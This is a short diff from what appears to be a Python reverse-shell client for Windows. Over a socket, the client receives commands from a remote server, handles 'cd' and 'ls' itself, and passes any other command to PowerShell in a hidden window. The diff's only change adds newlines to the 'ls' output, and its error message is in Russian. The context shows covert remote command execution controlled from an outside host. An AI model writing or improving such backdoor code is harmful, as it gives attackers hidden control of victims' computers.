@@ -23,7 +23,7 @@ with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as soc:
                 output = f"[!] Ошибка перехода директории: {err}"
         elif server_command.lower() == 'ls':
             files = listdir('.')
-            output = '\n'.join(files)
+            output = '\n' + '\n'.join(files) + '\n'
         else:
             try:
                 result = run(['powershell', '-Command', f'chcp 65001 > $null; {server_command}'], capture_output=True, text=True, encoding='utf-8', creationflags=CREATE_NO_WINDOW)
